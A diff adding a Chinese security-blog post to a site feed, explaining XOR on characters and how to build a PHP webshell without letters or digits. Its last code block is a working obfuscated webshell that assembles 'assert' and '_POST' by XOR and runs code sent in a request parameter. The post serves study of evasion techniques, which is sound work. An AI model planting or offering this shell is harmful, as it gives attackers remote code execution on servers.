@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>No character shell study</title>
+      <link href="/2019/01/18/No-character-shell-study/"/>
+      <url>/2019/01/18/No-character-shell-study/</url>
+      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博文是看了<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">无字母数字Webshell之提高篇 - FreeBuf互联网安全新媒体平台</a>，进行了一定的研究然后对异或进行了研究，从一开始的懵懵逼逼到后面的总结。<br><img src="https://truth.bahamut.com.tw/s01/201711/408f46a15ffa133d0a5e418dfb2d0b2e.JPG" alt="408f46a15ffa133d0a5e418dfb2d0b2e.JPG"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先说说什么的异或吧，比如说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;A&quot;^&quot;?&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果是~，为什么是 ~（懵逼）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">异或过程:</span><br><span class="line">先将异或的两个字符串转换为ASCII码</span><br><span class="line">A的ASCII:65</span><br><span class="line">?的ASCII:63</span><br><span class="line"></span><br><span class="line">寻找对应的二进制:</span><br><span class="line">ASCII码65的二进制为:0100 0001</span><br><span class="line">ASCII嘛63的二进制位:0011 1111</span><br><span class="line"></span><br><span class="line">异或过程，1碰0位1,0碰1为1，其他为0</span><br><span class="line">0100 0001</span><br><span class="line">0011 1111</span><br><span class="line">0111 1110</span><br><span class="line"></span><br><span class="line">结果为:01111110</span><br><span class="line"></span><br><span class="line">寻找对应的ASCII码:</span><br><span class="line">对应的ASCII码为:126</span><br><span class="line">对应的字符串为:~</span><br><span class="line"></span><br><span class="line">然后我们就得到了异或的整一个过程:</span><br><span class="line">字符串-&gt;ASCII-&gt;二进制-&gt;二进制异或的结果-&gt;ASCII码-&gt;字符串</span><br></pre></td></tr></table></figure><p>然后实现一个马子 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_0=(&quot;!&quot;^&quot;@&quot;).(&quot;3&quot;^&quot;@&quot;).(&quot;3&quot;^&quot;@&quot;).(&quot;%&quot;^&quot;@&quot;).(&quot;2&quot;^&quot;@&quot;).(&quot;4&quot;^&quot;@&quot;); /*assert*/</span><br><span class="line">$_1=&apos;_&apos;.(hex2bin(&quot;10&quot;)^&quot;@&quot;).(hex2bin(&quot;0F&quot;)^&quot;@&quot;).(hex2bin(&quot;13&quot;)^&quot;@&quot;).(hex2bin(&quot;14&quot;)^&quot;@&quot;);</span><br><span class="line">$_2=$$_1;</span><br><span class="line">$_0($_2[_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/18/k9uds0.png" alt="k9uds0.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> Writing </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>Secondary injection of sql injection</title>
       <link href="/2019/01/17/Secondary-injection-of-sql-injection/"/>
       <url>/2019/01/17/Secondary-injection-of-sql-injection/</url>
